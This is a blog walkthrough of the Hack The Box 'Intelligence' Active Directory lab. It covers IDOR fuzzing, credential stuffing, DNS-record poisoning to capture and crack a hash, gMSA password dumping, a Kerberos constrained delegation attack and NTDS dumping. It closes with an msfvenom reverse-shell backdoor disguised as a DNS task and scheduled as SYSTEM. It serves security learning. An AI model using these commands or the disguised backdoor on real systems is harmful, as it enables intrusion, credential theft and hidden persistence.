+++
tags = ["Box", "HTB", "Medium", "Active Directory", "Windows", "Kerberos", "KCD", "DNS"]
draft = false
title = "Intelligence HTB Walkthrough"
date = 2024-09-29
author = "bloodstiller"
+++

## Hack The Box Intelligence Walkthrough/Writeup: {#name-of-box-intelligence}

-   <https://app.hackthebox.com/machines/Intelligence>

## How I use variables &amp; wordlists: {#how-i-use-variables-and-wordlists}

-   **Variables**:
    -   In my commands you are going to see me use `$box`, `$user`, `$hash`, `$domain`, `$pass` often.
        -   I find the easiest way to eliminate type-os &amp; to streamline my process it is easier to store important information in variables &amp; aliases.
            -   `$box` = The IP of the box
            -   `$pass` = Passwords I have access to.
            -   `$user` = current user I am enumerating with.
                -   Depending on where I am in the process this can change if I move laterally.
            -   `$domain` = the domain name e.g. `sugarape.local` or `contoso.local`
        -   Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information.
-   **Wordlists**:
    -   I have symlinks all setup so I can get to my passwords from `~/Wordlists` so if you see me using that path that's why. If you are on Kali and following on, you will need to go to `/usr/share/wordlists`
        -   I also use these additional wordlists:
            -   [Statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
            -   [SecLists](https://github.com/danielmiessler/SecLists)
            -   [Auto_Wordlists](https://github.com/carlospolop/Auto_Wordlists)

## 1. Enumeration: {#1-dot-enumeration}


### NMAP: {#nmap}

-   **Basic Scan**:
    -   `nmap $box -Pn -oA basicScan`
        ```shell
          kali in 46-Boxes/46.02-HTB/BlogEntriesMade/Intelligence/scans  2GiB/7GiB | 0B/1GiB with /usr/bin/zsh
          🕙 16:27:13 zsh ❯ nmap $box -Pn -oA basicScan
          Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-27 16:27 BST
          Nmap scan report for 10.129.95.154
          Host is up (0.039s latency).
          Not shown: 988 filtered tcp ports (no-response)
          PORT     STATE SERVICE
          53/tcp   open  domain
          80/tcp   open  http
          88/tcp   open  kerberos-sec
          135/tcp  open  msrpc
          139/tcp  open  netbios-ssn
          389/tcp  open  ldap
          445/tcp  open  microsoft-ds
          464/tcp  open  kpasswd5
          593/tcp  open  http-rpc-epmap
          636/tcp  open  ldapssl
          3268/tcp open  globalcatLDAP
          3269/tcp open  globalcatLDAPssl

        ```

-   **In depth scan**:
    -   `sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP`
        ```shell
          kali in 46-Boxes/46.02-HTB/BlogEntriesMade/Intelligence/scans  2GiB/7GiB | 0B/1GiB with /usr/bin/zsh  took 10s
          🕙 16:27:28 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP
          [sudo] password for kali:
          Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-27 16:28 BST
          Nmap scan report for 10.129.95.154
          Host is up (0.078s latency).
          Not shown: 65516 filtered tcp ports (no-response)
          PORT      STATE SERVICE       VERSION
          53/tcp    open  domain        Simple DNS Plus
          80/tcp    open  http          Microsoft IIS httpd 10.0
          |_http-server-header: Microsoft-IIS/10.0
          | http-methods:
          |_  Potentially risky methods: TRACE
          |_http-title: Intelligence
          88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-09-27 22:30:53Z)
          135/tcp   open  msrpc         Microsoft Windows RPC
          139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
          389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
          |_ssl-date: 2024-09-27T22:32:28+00:00; +7h00m00s from scanner time.
          | ssl-cert: Subject: commonName=dc.intelligence.htb
          | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
          | Not valid before: 2021-04-19T00:43:16
          |_Not valid after:  2022-04-19T00:43:16
          445/tcp   open  microsoft-ds?
          464/tcp   open  kpasswd5?
          593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
          636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
          |_ssl-date: 2024-09-27T22:32:31+00:00; +7h00m00s from scanner time.
          | ssl-cert: Subject: commonName=dc.intelligence.htb
          | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
          | Not valid before: 2021-04-19T00:43:16
          |_Not valid after:  2022-04-19T00:43:16
          3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
          |_ssl-date: 2024-09-27T22:32:30+00:00; +7h00m00s from scanner time.
          | ssl-cert: Subject: commonName=dc.intelligence.htb
          | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
          | Not valid before: 2021-04-19T00:43:16
          |_Not valid after:  2022-04-19T00:43:16
          3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
          | ssl-cert: Subject: commonName=dc.intelligence.htb
          | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
          | Not valid before: 2021-04-19T00:43:16
          |_Not valid after:  2022-04-19T00:43:16
          |_ssl-date: 2024-09-27T22:32:27+00:00; +7h00m00s from scanner time.
          9389/tcp  open  mc-nmf        .NET Message Framing
          49667/tcp open  msrpc         Microsoft Windows RPC
          49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
          49692/tcp open  msrpc         Microsoft Windows RPC
          49710/tcp open  msrpc         Microsoft Windows RPC
          49713/tcp open  msrpc         Microsoft Windows RPC
          49737/tcp open  msrpc         Microsoft Windows RPC
          Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
          Device type: general purpose
          Running (JUST GUESSING): Microsoft Windows 2019 (89%)
          Aggressive OS guesses: Microsoft Windows Server 2019 (89%)
          No exact OS matches for host (test conditions non-ideal).
          Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

          Host script results:
          |_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
          | smb2-security-mode:
          |   3:1:1:
          |_    Message signing enabled and required
          | smb2-time:
          |   date: 2024-09-27T22:31:48
          |_  start_date: N/A

          OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
          Nmap done: 1 IP address (1 host up) scanned in 255.43 seconds

        ```

    -   **Discoveries**:
        -   {{< figure src="/ox-hugo/2024-09-27-172807_.png" >}}


### DNS `53`: {#dns-53}

-   As this is a Domain Controller it is running the DNS service.
-   I run `dnsenum` to enumerate the DNS service:
    -   `dnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Seclists/Discovery/DNS/subdomains-top1million-110000.txt intelligence.htb`
    -   {{< figure src="/ox-hugo/2024-09-27-182825_.png" >}}
    -   It is just the standard entries for any AD Domain.


### LDAP `389`: {#ldap-389}

-   **Using LDAP anonymous bind to enumerate further**:
    -   If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials.
        -   We can actually retrieve a significant amount of information via anonymous bind such as:
            -   A list of all users
            -   A list of all groups
            -   A list of all computers.
            -   User account attributes.
            -   The domain password policy.
            -   Enumerate users who are susceptible to AS-REPRoasting.
            -   Passwords stored in the description fields
        -   The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates.
-   I actually have a handy script to check if anonymous bind is enabled &amp; if it is to dump a large amount of information. You can find it here
    -   <https://github.com/bloodstiller/ldapchecker>

-   It turns out the anonymous bind is enabled and we get the below information. I have removed the majority of the information as it is not relevant, however there are some keys bits of information we can use moving forward.
    1.  <span class="underline">We have the naming context of the domain</span>:
        ```shell
        kali in ~/Desktop/WindowsTools 🐍 v3.11.9  4GiB/7GiB | 0B/1GiB with /usr/bin/zsh
        🕙 17:36:54 zsh ❯ python3 ldapchecker.py $box
        Attempting to connect to 10.129.95.154 with SSL...
        Connected successfully. Retrieving server information...
        DSA info (from DSE):
          Supported LDAP versions: 3, 2
          Naming contexts:
            DC=intelligence,DC=htb
            CN=Configuration,DC=intelligence,DC=htb
            CN=Schema,CN=Configuration,DC=intelligence,DC=htb
            DC=DomainDnsZones,DC=intelligence,DC=htb
            DC=ForestDnsZones,DC=intelligence,DC=htb
        ```

    2.  <span class="underline">We have the domain functionaility level</span>:
        ```shell
        Other:
          domainFunctionality:
            7
          forestFunctionality:
            7
          domainControllerFunctionality:
            7
          rootDomainNamingContext:
            DC=intelligence,DC=htb
          ldapServiceName:
            intelligence.htb:dc$@INTELLIGENCE.HTB
        ```

        -   The functionality level determines the minimum version of Windows server that can be used for a DC.
            -   +Note+: Any host os can be used on **workstations**, however the functionality level determines what the minimum version for DC's and the forest.
            -   <https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels>
            -   Knowing the function level is useful as if want to target the DC's and servers, we can know by looking at the function level what the minimum level of OS would be.

            -   In this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.
            -   Here’s a list of functional level numbers and their corresponding Windows Server operating systems:

                | Functional Level Number | Corresponding OS            |
                |-------------------------|-----------------------------|
                | 0                       | Windows 2000                |
                | 1                       | Windows Server 2003 Interim |
                | 2                       | Windows Server 2003         |
                | 3                       | Windows Server 2008         |
                | 4                       | Windows Server 2008 R2      |
                | 5                       | Windows Server 2012         |
                | 6                       | Windows Server 2012 R2      |
                | 7                       | Windows Server 2016         |
                | 8                       | Windows Server 2019         |
                | 9                       | Windows Server 2022         |

                -   +Note+:
                    -   Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest.
                    -   As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers.

    3.  <span class="underline">We have the full server name</span>:
        -   Again we can see this has the CN as the base (mentioned previously.) So it appears it's a printer server site of some sort. What is also interesting is the CN name "Configuration", this could imply that it is still to be configured. Which is interesting as things that are still being configured may not have had thorough security standards actioned.
            ```shell
            serverName:
                CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=intelligence,DC=htb
            ```

-   It's pretty amazing already what we have learned just by running some fairly simple ldap queries.
    -   We have the naming context.
    -   Domain name.


### SMB `445`: {#smb-445}

-   I check if we can use a null session or guest session to connect to the SMB Share:
    -   {{< figure src="/ox-hugo/2024-09-27-172540_.png" >}}


### HTTP `80`: {#http-80}

-   It's running a mostly unfinished website.
    -   {{< figure src="/ox-hugo/2024-09-27-174055_.png" >}}

-   Inspecting the website I the links for two documents &amp; they have a similar naming structure `YYYY-DD-MM-upload.pdf` &amp; are stored in the `documents` folder, this naming structure can easily be fuzzed using **FFUF**.
    -   {{< figure src="/ox-hugo/2024-09-27-174132_.png" >}}
    -   {{< figure src="/ox-hugo/2024-09-27-174003_.png" >}}

-   I do some dirbusting with feroxbuster and can see that there are multiple other entries in the `documents` folder:
    -   `feroxbuster -u http://$box`
        -   {{< figure src="/ox-hugo/2024-09-27-174345_.png" >}}


#### Fuzzing for Uploads using FFUF (Finding IDORs): {#fuzzing-for-uploads-using-ffuf--finding-idors}

-   **Creating a Simple Wordlist**:
    -   All of seclists are very long so I make a new list from 0-32 using a simple python terminal &amp; save that to my personal wordlists list:
        -   {{< figure src="/ox-hugo/2024-09-27-184117_.png" >}}
            -   +Note+: It's really important we put the leading zero's by utilizing format string literals as otherwise number's `1-9` will miss the leading zeros and as we can see this format is utilizing 2 digits to represent the month &amp; day so we would miss potential entries.

-   **Running FFUF**:
    -   `ffuf -w ~/Wordlists/45.06-CustomWordlists/numbersDays-1-31.txt:FIRST -w ~/Wordlists/45.06-CustomWordlists/numbersDays-1-31.txt:SECOND -u http://10.129.95.154/Documents/2020-FIRST-SECOND-upload.pdf`
        -   {{< figure src="/ox-hugo/2024-09-27-184550_.png" >}}
        -   I get ALOT of hits. To make things easier I am going to script a way to easily download all of these files.


#### Explanation of Vulnerability Indirect Object Reference (IDOR): {#explanation-of-vulnerability-indirect-object-reference--idor}

This type of vulnerability is called an Indirect Object Reference or (IDOR)

-   It is a security flaw where an application exposes a reference to an internal implementation object, such as a file, directory, or database key, without proper authorization checks.

-   **Common Examples**:
    -   Exposed database record IDs in URLs or form fields that can be manipulated to access other users' data.
    -   Direct references to files or directories in the web server that can be accessed or downloaded without proper authentication.
        -   This is what we took advantage of, just by seeing that there were two PDF's with the same naming structure of `YYYY-MM-DD-upload.pdf` we were able to fuzz the website and find other files that we should not be able to access and access them.

-   **Prevention Methods**:
    -   Implementing proper access control checks to ensure users can only access objects they are authorized to.
    -   Avoiding the use of direct object references in user-accessible inputs whenever possible.
    -   Using indirect reference maps or tokens to reference internal objects.

-   **Further reading on IDORs**:
    -   How to find IDORs:
        -   <https://vickieli.medium.com/how-to-find-more-idors-ae2db67c9489>
    -   OWASP:
        -   <https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References>


#### Scripting a simple mass down-loader to download the PDF's: {#scripting-a-simple-mass-down-loader-to-download-the-pdf-s}

-   Here is my script for mass downloading the files from site.
-   It's simple in that it essentially fuzzes for every day &amp; month combination &amp; depending on the `HTTP` response will download the file or print a message saying file not found.

<!--listend-->

```python
import requests

# Days from 01 to 31
days = [str(day).zfill(2) for day in range(1, 32)]

# Months from 01 to 12
months = [str(month).zfill(2) for month in range(1, 13)]

# Loop through days and months
for d in days:
    for m in months:
        # Construct the URL:
        url = f"http://10.129.95.154/Documents/2020-{m}-{d}-upload.pdf"
        response = requests.get(url)

        # Check if the request was successful:
        if response.status_code == 200:
            print(f"Downloading {url}")

            # Save the file locally & print message:
            file_name = f"2020-{m}-{d}-upload.pdf"
            with open(file_name, 'wb') as file:
                file.write(response.content)

        # If we get a 404 response print that no file was found:
        elif response.status_code == 404:
            print(f"No file found at {url}")
```


#### Converting the PDF's to text using `pdftotext` for easier processing: {#converting-the-pdf-s-to-text-using-pdftotext-for-easier-processing}

-   Looking at the results I can see that there is 86 files in there, which is ALOT to manually go through.
    -   {{< figure src="/ox-hugo/2024-09-29-072202_.png" >}}

-   **Install** `poppler-utils`:
    -   `sudo apt-get install poppler-utils`
-   **Convert the files**:
    -   `for p in *pdf; do pdftotext $p; done`
    -   This is a simple for loop that iterates through the list of `pdfs` in the folder and runs `pdftotext` on them to convert them.


#### Finding a default password &amp; a username in a pdf: {#finding-a-default-password-and-a-username-in-a-pdf}

-   After going through the converted pdf's I find a clear-text password
    -   {{< figure src="/ox-hugo/2024-09-29-073600_.png" >}}
-   And a username from an IT user called "Ted":
    -   {{< figure src="/ox-hugo/2024-09-29-074702_.png" >}}
    -   Unfortunately this is not a valid username in `AD` it should be `first.lastname` for SAM Accounts.


#### Extracting Usernames from the creator field of the PDF's: {#extracting-usernames-from-the-creator-field-of-the-pdf-s}

-   **PDF Metadata Collection**:
    -   When creating a PDF, many programs (e.g., Microsoft Word, Adobe Acrobat) automatically pull metadata from the system.
-   **System Environment Variables**:
    -   The logged-in Windows username is part of system environment variables. This is often used to populate fields like "`Creator`" in the PDF document.
-   **Program Defaults**:
    -   By default, many PDF generation tools use the logged-in username as the creator unless manually changed by the user.
-   **Tracking Ownership**:
    -   This feature helps track the original creator or author of a document for auditing or document management purposes.

-   **Reading the data**:
    -   We can read the data using the tool [exiftool](https://linux.die.net/man/1/exiftool)
        -   I believe it is installed by default in [kali](https://www.kali.org/tools/libimage-exiftool-perl/)
    -   It also means we can extract valid SAM account names from the PDFs!

-   **Command to extract usernames from pdf metadata &amp; save to a list**:
    -   `exiftool -Creator -csv *pdf | cut -d, -f2 | sort | uniq > userNames.txt`
    -   Looking at our results we can see we have valid SAM names &amp; a total user count of 31 users that we have extracted.
        -   {{< figure src="/ox-hugo/2024-09-29-083118_.png" >}}


##### Command Breakdown {#command-breakdown}

1.  `exiftool -Creator -csv *pdf`
    -   `exiftool`: Run the tool
    -   `-Creator`: Extracts the `Creator` metadata field from the files.
    -   `-csv`: Outputs the data in CSV format.
        -   This is the most important part for the rest of the command to work:
            -   The `CSV` format provides a structured way to output the metadata in rows and columns. When extracting metadata from multiple PDFs, each PDF's metadata is presented as a row, and each field (like "`Creator`") is a column. This makes it easier to process the data programmatically.
            -   **Simplicity**: When using tools like `cut`, it’s easier to extract specific fields by referring to column numbers (e.g., `-f2` for the second column), which is straightforward with `CSV` formatting.
    -   `*pdf`: Targets all PDF files in the current directory.
2.  `| cut -d, -f2`
    -   `|`: Pipes the output from the previous command into the next.
    -   `cut`: Extracts specific fields from the CSV output.
    -   `-d,`: Uses a comma as the delimiter (since it's CSV data).
    -   `-f2`: Selects the second field, which contains the creator name.
3.  `| sort`: Sorts the creator names alphabetically.
4.  `| uniq`: Removes duplicate names, leaving only unique entries.

5.  `> userNames.txt`
    -   Redirects the final output (unique creator names) into a file named `userNames.txt`


## 2. Foothold: {#2-dot-foothold}


### Credential Stuffing with netexec: {#credential-stuffing-with-netexec}

-   **Credential Stuffing**:
    -   `netexec smb $box -u userList.txt -p $pass --shares --continue-on-success | grep [+]`
    -   **We get a hit**:
        -   {{< figure src="/ox-hugo/2024-09-29-083833_.png" >}}
    -   We can see she has access to some interesting shares, namely `IT`, `Users` &amp; `Sysvol`.


### Credentialed SMB Enumeration: {#credentialed-smb-enumeration}


#### Enumerating Users Share: {#enumerating-users-share}

-   Connecting to the users share I find it is as it says a list of user directories:
-   {{< figure src="/ox-hugo/2024-09-29-085343_.png" >}}
-   I get the `user.txt` flag:
    -   {{< figure src="/ox-hugo/2024-09-29-085609_.png" >}}
    -   {{< figure src="/ox-hugo/2024-09-29-085629_.png" >}}
-   I check the `SYSVOL` share but there is nothing of note there.
-   I also asreproasted &amp; kerberoasted using netexec, nothing of note.
-   I checked the `NETLOGON` share.
-   I also tried secrets-dump (sometimes great to do with a low-priv account as you never know what you will get)


#### Finding a user script: {#finding-a-user-script}

-   I connect to the IT share and find a file called `downdetector.ps1`
-   {{< figure src="/ox-hugo/2024-09-29-084208_.png" >}}
-   {{< figure src="/ox-hugo/2024-09-29-084834_.png" >}}
    -   Looking at the script it checks if any hosts with a DNS name that starts with `web` are down every 5 minutes and then emails `Ted.Graves`. What using is particularly interesting about this though is that it sends a **Credentialed Request** using the user `Ted.Graves` `-UseDefaultCredentials` to each of the entries; meaning if we can get it to try to authenticate to us by adding a fake `DNS` entry we can potentially grab `Ted.Graves` credentials!!! As he is receiving these emails we can safely assume he is either part of IT or networking (plus this is probably the script that was referenced in the PDF's we pulled).


## 3. Lateral Movement &amp; Privilege Escalation: {#3-dot-lateral-movement-and-privilege-escalation}


### Adding a Malicious DNS Entry using `dnstool.py`: {#adding-a-malicious-dns-entry-using-dnstool-dot-py}

-   We can use the tool [dnstool](https://github.com/dirkjanm/krbrelayx) which is part of [krbrelayx](https://github.com/dirkjanm/krbrelayx).
    -   This tool enables us to "Add/modify/delete Active Directory Integrated DNS records via LDAP."

-   **Clone The Repo**:
    -   `git clone https://github.com/dirkjanm/krbrelayx.git /opt/krbrelayx`

-   **I start** [responder](https://www.kali.org/tools/responder/):
    -   `sudo responder -v -I tun0`
    -   {{< figure src="/ox-hugo/2024-09-29-100651_.png" >}}

-   **I make `dns`  entry**:
    -   `python3 dnstool.py $box -u intelligence\\$user -p $pass --action add --record web-bloodstiller --data $myip --type A`
    -   +Note+:
        -   It requires the hostname/ip as an argument but there is no flag for it, it just accepts it.
        -   {{< figure src="/ox-hugo/2024-09-29-101431_.png" >}}

-   **We capture a hash for** `ted.graves`:
    -   {{< figure src="/ox-hugo/2024-09-29-101932_.png" >}}


#### Why can we just add malicious DNS entries to a Domain Controller?: {#why-can-we-just-add-malicious-dns-entries-to-a-domain-controller}

-   So I had to go searching for this information as I was not sure if this vulnerability was the result of our user `Tiffany.Molina` having this privilege.
    -   There is no evidence she is part of any DNS administration groups:
        -   {{< figure src="/ox-hugo/2024-09-29-152328_.png" >}}
    -   I read some sources saying that by default any authenticated user can add DNS entries in an AD environment.
        -   [ippsec](https://ippsec.rocks/#) also states this [here](https://youtu.be/Jg_BjkxdtsE?si=k7tT5SqHvuZYvPn-&t=1666)
        -   Whereas Kevin Robertson (creator of [PowerMad](https://github.com/Kevin-Robertson/Powermad) &amp; [Inveigh](https://github.com/Kevin-Robertson/Inveigh/tree/dev)) states:

            > Modifying ADIDNS Zones
            > There are two primary methods of remotely modifying an ADIDNS zone. The first involves using the RPC based management tools. These tools generally require a DNS administrator or above so I won’t bother describing their capabilities. The second method is DNS dynamic updates. Dynamic updates is a DNS specific protocol designed for modifying DNS zones. Within the AD world, dynamic updates is primarily leveraged by machine accounts to add and update their own DNS records.

            -   Source: <https://www.netspi.com/blog/technical-blog/network-penetration-testing/exploiting-adidns/>


### Cracking Teds Hash using Hashcat: {#cracking-teds-hash-using-hashcat}

-   **I use hashcat to cracks Ted's password**:
    -   `hashcat -m 5600 ted.hash ~/Wordlists/rockyou.txt`
    -   {{< figure src="/ox-hugo/2024-09-29-102210_.png" >}}


### Running Bloodhound as Ted Graves: {#running-bloodhound-as-ted-graves}

-   As we have Ted's creds we can run the python collector for bloodhound.
    -   `python3 bloodhound.py -dc dc.intelligence.htb -c All -u $user -p $pass -d intelligence.htb -ns $box`
    -   We can see that Ted part of the `ITSUPPORT` group and this group has the ability to read the `GMSAPassword` of the host `SVC_INT$`:
        -   {{< figure src="/ox-hugo/2024-09-29-104906_.png" >}}
    -   Looking further we can see that the host `SVC_INT$` has the constrained delegation privilege over the Domain Controller `DC.INTELLIGENCE.HTB` this gives us a clear attack path as we can perform a constrained delegation attack.
        -   {{< figure src="/ox-hugo/2024-09-29-163508_.png" >}}


### Using `gMSADumper.py` to dump the `gMSA` Password: {#using-gmsadumper-dot-py-to-dump-the-gmsa-password}

-   **I dump the** `gMSA` **Password using** [gMSADumper.py](https://github.com/micahvandeusen/gMSADumper)
    -   `python3 gMSADumper.py -u $user -p $pass -d intelligence.htb`
    -   {{< figure src="/ox-hugo/2024-09-29-153724_.png" >}}
        -   The first line is the `NTLM` hash of the `SVC_INT$` machine account.

-   **I verify the hash is valid using netexec**:
    -   `netexec smb $box -u svc_int$ -H $hash --shares`
        -   {{< figure src="/ox-hugo/2024-09-29-154021_.png" >}}


#### What is gMSA &amp; gMSA Password?: {#what-is-gmsa-and-gmsa-password}

-   **gMSA (Group Managed Service Account)**:
    -   A `gMSA` is a type of service account in Active Directory that is designed to enhance security and reduce administrative overhead for service accounts. They provide automatic password management &amp; simplified service principal name (SPN) management.

-   **The password for a** `gMSAccount` **is a** `gMSA` **password**:
    -   They are automatically generated by Active Directory &amp; 240 characters long !!! So not even worth trying to crack
    -   They are automatically rotated regularly:
        -   (default is 30 days)
    -   They are not known or accessible to administrators.

-   **Some further points about** `gMSA` **passwords**:
    -   They eliminate the need for manual password resets as they are handled by the system.
    -   The password is managed by the domain controllers
    -   Authorized hosts can retrieve the current password when needed
    -   This approach significantly reduces the risk of password-related security issues


## 4. Ownership: {#4-dot-ownership}


### 1. Clock Synchronization To Ensure Kerberos Tickets Are Valid: {#1-dot-clock-synchronization-to-ensure-kerberos-tickets-are-valid}

-   **Sync The Clock of our Attack Host with the Target**:
    -   I sync my clock with the host, this is crucially important as Kerberos has time based checks when authorizing we need to ensure our times our synced with our target.
        -   The error you will see if your clock is not synced:
            -   {{< figure src="/ox-hugo/2024-09-29-161841_.png" >}}

-   **If you are on kali do the following**:
    -   `sudo apt install ntpdate`
        -   Ensure that you have the host in your `/etc/hosts` file &amp; then run: `sudo ntpdate -s intelligence.htb` this will sync your clocks.
            -   {{< figure src="/ox-hugo/2024-09-29-161947_.png" >}}


### 2. Kerberos Constrained Delegation (KCD) Attack: {#2-dot-kerberos-constrained-delegation--kcd--attack}

-   **I launch the constrained delegation attack**:
    -   `impacket-getST -spn WWW/dc.intelligence.htb 'INTELLIGENCE.HTB/svc_int' -impersonate Administrator -dc-ip $box -hashes :$hash`
        -   {{< figure src="/ox-hugo/2024-09-29-161418_.png" >}}
        -   Despite getting a lot of errors I still get a `.cacche` file.


#### Constrained Delegation KCD Attack Explained: {#constrained-delegation-kcd-attack-explained}

1.  **Compromise a Service Account**:
    -   We need to gain control of a service account that has been configured for constrained delegation.
    -   We have control over `svc_int$` computer account

2.  **Identify Delegation Targets**:
    -   Enumerates the services which our compromised account is allowed to delegate to.
        -   We know we can delegate to `WWW/dc.intelligence.htb` which is a service running on the Domain Controller

3.  **Request a TGT**: Handled by `impacket-getST`
    -   We requests a Ticket Granting Ticket (TGT) for the compromised service account.

4.  **Request a Service Ticket**: `impacket-getST`
    -   Using the TGT, the we requests a service ticket for one of the allowed delegation targets.
    -   We specify the user they want to impersonate in this case it will be the `Administrator` account.

5.  **S4U2Self**: `impacket-getST`
    -   The Key Distribution Center (KDC) performs an `S4U2Self` (Service for User to Self) operation.
    -   This creates a service ticket as if the impersonated user (Administrator) had requested it.

6.  **S4U2Proxy**: `impacket-getST`
    -   The KDC then performs an `S4U2Proxy` (Service for User to Proxy) operation.
    -   This allows the service ticket to be used for delegation to the target service.

7.  **Access Target Service**:
    -   We can now use this ticket to access the target service, appearing as the impersonated user.


### 3. Load the `.ccache` into memory with the `KRB5CCNAME` variable: {#3-dot-load-the-dot-ccache-into-memory-with-the-krb5ccname-variable}

-   **First I rename the** `.ccache`:
    -   {{< figure src="/ox-hugo/2024-09-29-164539_.png" >}}
    -   +Note+: The only reason I do this is because it's neater visually, there is no other reason to do this other than personal preference, that is all.

-   **Load the** `.ccache` **into the** `KRB5CCNAME` **variable**:
    -   The `KRB5CCNAME` environment is variable used by Kerberos 5 (KRB5) as a pointer to the `.cacche` which actually stores the creds.


### 4. Getting a shell using impacket-psexec: {#4-dot-getting-a-shell-using-impacket-psexec}

-   As we have the `KRB5CCNAME` variable pointing at our `.ccache` file we can use kerberos authentication get a shell:
    -   `impacket-psexec intelligence.htb/administrator@dc.intelligence.htb -k -no-pass -dc-ip $box -target-ip $box`
        -   {{< figure src="/ox-hugo/2024-09-29-165744_.png" >}}

-   **Root flag obtained**:
    -   {{< figure src="/ox-hugo/2024-09-29-165757_.png" >}}


## 5. Ownership: {#5-dot-ownership}


### Dumping NTDS using netexec and our kerberos credentials: {#dumping-ntds-using-netexec-and-our-kerberos-credentials}

-   As `netexec` also allows kerberos authentication we can dump the `NTDS` database to extract all the hashes from the DC.
    -   {{< figure src="/ox-hugo/2024-09-29-165910_.png" >}}

-   **I verify the Administrators hash works by creating starting a session using** `evil-winrm`:
    -   `evil-winrm -i $box -u administrator -H $hash`
    -   {{< figure src="/ox-hugo/2024-09-29-170148_.png" >}}


## 6. Persistence: {#6-dot-persistence}


### Creating a windows scheduled task to enable a backdoor. {#creating-a-windows-scheduled-task-to-enable-a-backdoor-dot}

-   I understand this is a box but I want to demonstrate how we can achieve persistence:

-   **I create an obfuscated shell using msfvenom**:
    -   `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.19 LPORT=53 -a x86 --platform windows -e x86/shikata_ga_nai -i 100 -f raw | msfvenom -a x86 --platform windows -e x86/countdown -i 200 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -f exe -o dnsTask.exe`
        -   I use port `53` &amp; call it `dnsTask.exe` as a way to make it appear like a normal `DNS` task connecting to a `DNS` server.

-   **I upload this to the target via** `evil-winrm` **to** `C:\Windows`:
    -   {{< figure src="/ox-hugo/2024-09-29-171504_.png" >}}
    -   I upload it to the `C:\Windows` folder as a further way to make it look authentic.

-   **I create a scheduled task to execute my shell every 1 minute**:
    -   `schtasks /create /sc minute /mo 1 /tn "dnsTask" /tr C:\Windows\dnsTask.exe /ru "SYSTEM"`
        -   {{< figure src="/ox-hugo/2024-09-29-171640_.png" >}}
        -   **Command Breakdown**:
            -   `schtasks`: The command-line utility in Windows used to create, delete, configure, or display scheduled tasks.
            -   `/create`: This option tells schtasks to create a new scheduled task.
            -   `/sc minute`: This specifies the schedule frequency for the task. In this case, it will run every minute.
            -   `/mo 1`: Modifies the frequency (modifier) to occur every 1 minute.
            -   `/tn "dns"`: The task's name is "dnsTask".
            -   `/tr C:\dnsTask.exe`: The task will run the script or command C:\tools\shell.cmd.
            -   `/ru "SYSTEM"`: This specifies that the task will run under the SYSTEM"~ user account, which gives it high-level privileges.

-   **I start my listener in** `nc.exe`
    -   `nc -nvlp 53`
    -   And&#x2026;..nothing, I believe my shell is being caught by defender.
        -   I will need to find another way, but that can wait for another day.


## Lessons Learned: {#lessons-learned}


### What did I learn? {#what-did-i-learn}

1.  I learned that users may or may not be able to add DNS entries (super clear I know.)
2.  I never had considered using DNS as a means to for spoofing before which was a cool thing to do.


### What silly mistakes did I make? {#what-silly-mistakes-did-i-make}

1.  I didn't specify the `SPN` the first time when running the `KCD` attack.
2.  I ran bloodhound a little too late. This was mainly due to having issues with `bloodhound.py` but after setting it up in a `venv` it was fine.


## Sign off: {#sign-off}

Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!

Until next time, hack the planet!

&#x2013; Bloodstiller

&#x2013; Get in touch bloodstiller at proton dot me


